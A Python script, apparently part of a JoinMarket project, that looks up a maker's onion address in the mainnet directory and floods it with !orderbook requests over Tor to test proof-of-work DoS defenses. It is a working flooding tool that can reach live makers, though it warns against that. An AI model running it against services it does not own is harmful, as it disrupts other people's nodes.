#!/usr/bin/env python3
"""
DoS Testing Tool - Test PoW defense effectiveness against !orderbook flooding.

This tool simulates a DoS attack against a maker's onion hidden service to verify
that Tor's PoW defense (available in Tor 0.4.9.2+) works correctly.

The tool:
1. Extracts the maker's onion address from the directory peerlist
2. Floods the maker with !orderbook requests directly via Tor
3. Logs request rates, response times, and any PoW requirements

Usage:
  # Test DoS against a maker by nick (extracts onion from directory)
  python scripts/dos_test.py <maker_nick> [--rps <rate>] [--duration <seconds>]

  # Test DoS against a specific onion address
  python scripts/dos_test.py --onion <address:port> [--rps <rate>] [--duration <seconds>]

Examples:
  # Flood maker at 10 requests/second for 30 seconds
  python scripts/dos_test.py J57JWFagDLs4eDUB --rps 10 --duration 30

  # Flood specific onion at maximum rate
  python scripts/dos_test.py --onion abc123.onion:5222 --rps 100 --duration 60

WARNING: Only use this tool against your own test makers! DoS attacks against
real makers without permission is unethical and potentially illegal.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path

# Add jmcore to path
sys.path.insert(0, str(Path(__file__).parent.parent / "jmcore" / "src"))

from jmcore.crypto import NickIdentity
from jmcore.network import connect_via_tor
from jmcore.protocol import MessageType, parse_peerlist_entry


@dataclass
class Stats:
    """Statistics for the DoS test."""

    requests_sent: int = 0
    responses_received: int = 0
    errors: int = 0
    connection_failures: int = 0
    timeouts: int = 0
    start_time: float = 0.0
    response_times: deque = field(default_factory=lambda: deque(maxlen=1000))
    last_report_time: float = 0.0
    last_report_requests: int = 0

    def rps(self) -> float:
        """Calculate current requests per second."""
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return self.requests_sent / elapsed
        return 0.0

    def success_rate(self) -> float:
        """Calculate success rate."""
        if self.requests_sent > 0:
            return (self.responses_received / self.requests_sent) * 100
        return 0.0

    def avg_response_time(self) -> float:
        """Calculate average response time in ms."""
        if self.response_times:
            return sum(self.response_times) / len(self.response_times) * 1000
        return 0.0

    def report(self) -> str:
        """Generate a status report."""
        elapsed = time.time() - self.start_time
        current_rps = 0.0
        if self.last_report_time > 0:
            interval = time.time() - self.last_report_time
            if interval > 0:
                current_rps = (
                    self.requests_sent - self.last_report_requests
                ) / interval

        self.last_report_time = time.time()
        self.last_report_requests = self.requests_sent

        return (
            f"[{elapsed:6.1f}s] "
            f"Sent: {self.requests_sent:5d} | "
            f"Err: {self.errors:3d} | "
            f"ConnFail: {self.connection_failures:3d} | "
            f"RPS: {current_rps:5.1f}"
        )


async def extract_onion_from_directory(
    maker_nick: str,
    directory_onion: str = "nakamotourflxwjnjpnrk7yc2nhkf6r62ed4gdfxmmn5f4saw5q5qoyd.onion",
    directory_port: int = 5222,
    socks_host: str = "127.0.0.1",
    socks_port: int = 9050,
) -> str | None:
    """
    Extract maker's onion address from directory peerlist.

    Args:
        maker_nick: The nick to look up
        directory_onion: Directory server onion address
        directory_port: Directory server port
        socks_host: Tor SOCKS proxy host
        socks_port: Tor SOCKS proxy port

    Returns:
        The maker's onion:port string, or None if not found
    """
    print(f"Connecting to directory {directory_onion}:{directory_port}...")

    nick_identity = NickIdentity()
    our_nick = nick_identity.nick

    try:
        conn = await connect_via_tor(
            onion_address=directory_onion,
            port=directory_port,
            socks_host=socks_host,
            socks_port=socks_port,
            max_message_size=2097152,
            timeout=60.0,
        )
        print("Connected to directory!")

        # Send handshake
        handshake = {
            "type": MessageType.HANDSHAKE.value,
            "line": json.dumps(
                {
                    "app-name": "joinmarket",
                    "directory": False,
                    "location-string": "NOT-SERVING-ONION",
                    "proto-ver": 5,
                    "features": {"peerlist_features": True},
                    "nick": our_nick,
                    "network": "mainnet",
                }
            ),
        }
        await conn.send(json.dumps(handshake).encode())

        # Wait for handshake response
        for _ in range(10):
            try:
                data = await asyncio.wait_for(conn.receive(), timeout=5.0)
                if data:
                    msg = json.loads(data.decode())
                    if msg.get("type") == MessageType.HANDSHAKE.value:
                        break
            except asyncio.TimeoutError:
                continue

        # Request peerlist
        getpeerlist_msg = {"type": MessageType.GETPEERLIST.value, "line": ""}
        await conn.send(json.dumps(getpeerlist_msg).encode())
        print("Sent GETPEERLIST request, waiting for response...")

        # Collect peerlist entries
        maker_location = None
        timeout_count = 0
        max_timeouts = 5

        while timeout_count < max_timeouts:
            try:
                data = await asyncio.wait_for(conn.receive(), timeout=5.0)
                if not data:
                    continue

                msg = json.loads(data.decode())

                if msg.get("type") == MessageType.PEERLIST.value:
                    peerlist_str = msg.get("line", "")
                    if peerlist_str:
                        for entry in peerlist_str.split(","):
                            entry = entry.strip()
                            if not entry or ";" not in entry:
                                continue
                            try:
                                nick, location, disconnected, _features = (
                                    parse_peerlist_entry(entry)
                                )
                                if nick == maker_nick and not disconnected:
                                    maker_location = location
                                    print(f"Found {maker_nick} at {location}")
                            except Exception:
                                continue

                    # Reset timeout counter on valid response
                    timeout_count = 0

            except asyncio.TimeoutError:
                timeout_count += 1
                if maker_location:
                    break  # We found it, stop waiting

        await conn.close()
        return maker_location

    except Exception as e:
        print(f"Error connecting to directory: {e}")
        return None


async def flood_single_connection(
    onion_address: str,
    port: int,
    stats: Stats,
    stop_event: asyncio.Event,
    target_rps: float,
    socks_host: str = "127.0.0.1",
    socks_port: int = 9050,
    connection_id: int = 0,
) -> None:
    """
    Flood a maker with orderbook requests using a single connection.

    Args:
        onion_address: The maker's onion address (without port)
        port: The maker's port
        stats: Stats object to update
        stop_event: Event to signal stop
        target_rps: Target requests per second
        socks_host: Tor SOCKS proxy host
        socks_port: Tor SOCKS proxy port
        connection_id: ID for this connection (for logging)
    """
    request_interval = 1.0 / target_rps if target_rps > 0 else 0

    while not stop_event.is_set():
        try:
            # Connect to maker
            conn = await connect_via_tor(
                onion_address=onion_address,
                port=port,
                socks_host=socks_host,
                socks_port=socks_port,
                max_message_size=2097152,
                timeout=30.0,
            )

            # Create identity for this connection
            nick_identity = NickIdentity()
            our_nick = nick_identity.nick

            # Send handshake
            handshake = {
                "type": MessageType.HANDSHAKE.value,
                "line": json.dumps(
                    {
                        "app-name": "joinmarket",
                        "directory": False,
                        "location-string": "NOT-SERVING-ONION",
                        "proto-ver": 5,
                        "features": {},
                        "nick": our_nick,
                        "network": "mainnet",
                    }
                ),
            }
            await conn.send(json.dumps(handshake).encode())

            # Wait for handshake response
            # Makers respond with DN_HANDSHAKE (795) since they act as directory-like nodes
            # for direct connections, so accept both HANDSHAKE (793) and DN_HANDSHAKE (795)
            valid_handshake_types = (
                MessageType.HANDSHAKE.value,
                MessageType.DN_HANDSHAKE.value,
            )
            data: bytes | None = None
            try:
                data = await asyncio.wait_for(conn.receive(), timeout=10.0)
                if data:
                    msg = json.loads(data.decode())
                    msg_type = msg.get("type")
                    if msg_type not in valid_handshake_types:
                        print(
                            f"\n[Conn {connection_id}] Unexpected response type: {msg_type} "
                            f"(expected {valid_handshake_types})"
                        )
                        print(f"[Conn {connection_id}] Response: {msg}")
                        stats.errors += 1
                        await conn.close()
                        continue
                else:
                    print(f"\n[Conn {connection_id}] Empty handshake response")
                    stats.errors += 1
                    await conn.close()
                    continue
            except asyncio.TimeoutError:
                print(f"\n[Conn {connection_id}] Handshake timeout")
                stats.timeouts += 1
                await conn.close()
                continue
            except json.JSONDecodeError as e:
                print(f"\n[Conn {connection_id}] Invalid JSON in handshake: {e}")
                if data:
                    print(f"[Conn {connection_id}] Raw data: {data!r}")
                stats.errors += 1
                await conn.close()
                continue

            # Flood with orderbook requests
            while not stop_event.is_set():
                request_start = time.time()

                # Send !orderbook
                orderbook_msg = {
                    "type": MessageType.PUBMSG.value,
                    "line": f"{our_nick}!PUBLIC!!orderbook",
                }
                await conn.send(json.dumps(orderbook_msg).encode())
                stats.requests_sent += 1

                # Try to receive response (non-blocking)
                # Makers now respond to !orderbook via the direct connection.
                # Expected behavior:
                # - First request: Gets full offer response
                # - Subsequent requests (within 30s): Rate limited (no response)
                # - After 10 violations: Connection is banned and closed
                try:
                    data = await asyncio.wait_for(conn.receive(), timeout=0.5)
                    if data:
                        response_time = time.time() - request_start
                        stats.response_times.append(response_time)
                        stats.responses_received += 1

                        # Check for rate limit or PoW messages
                        try:
                            msg = json.loads(data.decode())
                            line = msg.get("line", "")
                            if "rate" in line.lower() or "limit" in line.lower():
                                print(
                                    f"\n[Conn {connection_id}] Rate limit message: {line}"
                                )
                            if "pow" in line.lower() or "proof" in line.lower():
                                print(f"\n[Conn {connection_id}] PoW message: {line}")
                        except Exception:
                            pass

                except asyncio.TimeoutError:
                    # Expected - maker responds via directory, not direct connection
                    pass

                # Rate limiting
                if request_interval > 0:
                    elapsed = time.time() - request_start
                    if elapsed < request_interval:
                        await asyncio.sleep(request_interval - elapsed)

            await conn.close()

        except ConnectionRefusedError:
            stats.connection_failures += 1
            await asyncio.sleep(1.0)  # Back off on connection failure
        except Exception as e:
            stats.errors += 1
            if "Circuit" in str(e) or "closed" in str(e).lower():
                # Connection was closed, reconnect
                await asyncio.sleep(0.5)
            else:
                print(f"\n[Conn {connection_id}] Error: {e}")
                await asyncio.sleep(1.0)


async def run_dos_test(
    onion_address: str,
    port: int,
    target_rps: float = 10.0,
    duration: float = 30.0,
    num_connections: int = 1,
    socks_host: str = "127.0.0.1",
    socks_port: int = 9050,
) -> Stats:
    """
    Run the DoS test against a maker.

    Args:
        onion_address: Maker's onion address (without port)
        port: Maker's port
        target_rps: Target requests per second (per connection)
        duration: Test duration in seconds
        num_connections: Number of concurrent connections
        socks_host: Tor SOCKS proxy host
        socks_port: Tor SOCKS proxy port

    Returns:
        Stats object with test results
    """
    print(f"\n{'=' * 70}")
    print("DoS Test Configuration:")
    print(f"  Target: {onion_address}:{port}")
    print(
        f"  Target RPS: {target_rps} per connection ({target_rps * num_connections} total)"
    )
    print(f"  Duration: {duration} seconds")
    print(f"  Connections: {num_connections}")
    print(f"{'=' * 70}\n")

    stats = Stats()
    stats.start_time = time.time()
    stats.last_report_time = stats.start_time

    stop_event = asyncio.Event()

    # Start flood tasks
    tasks = []
    for i in range(num_connections):
        task = asyncio.create_task(
            flood_single_connection(
                onion_address=onion_address,
                port=port,
                stats=stats,
                stop_event=stop_event,
                target_rps=target_rps,
                socks_host=socks_host,
                socks_port=socks_port,
                connection_id=i,
            )
        )
        tasks.append(task)

    # Report loop
    report_interval = 2.0
    elapsed = 0.0

    while elapsed < duration:
        await asyncio.sleep(report_interval)
        elapsed = time.time() - stats.start_time
        print(stats.report())

    # Stop all tasks
    stop_event.set()
    await asyncio.sleep(1.0)  # Give tasks time to clean up

    for task in tasks:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

    return stats


async def main() -> None:
    parser = argparse.ArgumentParser(
        description="DoS Testing Tool for JoinMarket makers",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: Only use this tool against your own test makers!

Examples:
  # Test by nick (extracts onion from directory)
  python scripts/dos_test.py J57JWFagDLs4eDUB --rps 10 --duration 30

  # Test specific onion
  python scripts/dos_test.py --onion abc123.onion:5222 --rps 50

  # High intensity test with multiple connections
  python scripts/dos_test.py J5TestMaker --rps 20 --connections 5 --duration 60
""",
    )

    parser.add_argument(
        "nick",
        nargs="?",
        help="Maker nick to test (extracts onion from directory)",
    )
    parser.add_argument(
        "--onion",
        help="Direct onion:port to test (bypasses directory lookup)",
    )
    parser.add_argument(
        "--rps",
        type=float,
        default=10.0,
        help="Target requests per second per connection (default: 10)",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help="Test duration in seconds (default: 30)",
    )
    parser.add_argument(
        "--connections",
        type=int,
        default=1,
        help="Number of concurrent connections (default: 1)",
    )
    parser.add_argument(
        "--directory",
        default="nakamotourflxwjnjpnrk7yc2nhkf6r62ed4gdfxmmn5f4saw5q5qoyd.onion:5222",
        help="Directory server onion:port",
    )
    parser.add_argument(
        "--socks-host",
        default="127.0.0.1",
        help="Tor SOCKS proxy host (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--socks-port",
        type=int,
        default=9050,
        help="Tor SOCKS proxy port (default: 9050)",
    )

    args = parser.parse_args()

    if not args.nick and not args.onion:
        parser.error("Either nick or --onion must be provided")

    # Determine target
    if args.onion:
        # Direct onion specified
        if ":" in args.onion:
            onion_address, port_str = args.onion.rsplit(":", 1)
            port = int(port_str)
        else:
            onion_address = args.onion
            port = 5222
        # Ensure .onion suffix is present
        if not onion_address.endswith(".onion"):
            onion_address = onion_address + ".onion"
    else:
        # Look up nick in directory
        print(f"Looking up {args.nick} in directory...")

        dir_parts = args.directory.split(":")
        dir_onion = dir_parts[0]
        dir_port = int(dir_parts[1]) if len(dir_parts) > 1 else 5222

        location = await extract_onion_from_directory(
            maker_nick=args.nick,
            directory_onion=dir_onion,
            directory_port=dir_port,
            socks_host=args.socks_host,
            socks_port=args.socks_port,
        )

        if not location:
            print(f"Could not find {args.nick} in directory peerlist")
            print("The maker might be offline or using NOT-SERVING-ONION")
            sys.exit(1)

        if location == "NOT-SERVING-ONION":
            print(f"{args.nick} is not serving via onion (location: NOT-SERVING-ONION)")
            print("Cannot perform direct DoS test - maker relies on directory routing")
            sys.exit(1)

        # Parse location
        if ":" in location:
            onion_address, port_str = location.rsplit(":", 1)
            port = int(port_str)
        else:
            onion_address = location
            port = 5222

        # Ensure .onion suffix is present
        if not onion_address.endswith(".onion"):
            onion_address = onion_address + ".onion"

    print(f"\nTarget: {onion_address}:{port}")
    print("\nStarting DoS test in 3 seconds...")
    print("Press Ctrl+C to stop early\n")
    await asyncio.sleep(3)

    try:
        stats = await run_dos_test(
            onion_address=onion_address,
            port=port,
            target_rps=args.rps,
            duration=args.duration,
            num_connections=args.connections,
            socks_host=args.socks_host,
            socks_port=args.socks_port,
        )

        # Final report
        print(f"\n{'=' * 70}")
        print("FINAL RESULTS")
        print(f"{'=' * 70}")
        print(f"Total requests sent:     {stats.requests_sent}")
        print(f"Total responses:         {stats.responses_received}")
        print(f"Total errors:            {stats.errors}")
        print(f"Total timeouts:          {stats.timeouts}")
        print(f"Connection failures:     {stats.connection_failures}")
        print(f"Average RPS:             {stats.rps():.1f}")
        print(f"Success rate:            {stats.success_rate():.1f}%")
        print(f"Avg response time:       {stats.avg_response_time():.1f}ms")
        print(f"{'=' * 70}")

    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")


if __name__ == "__main__":
    asyncio.run(main())
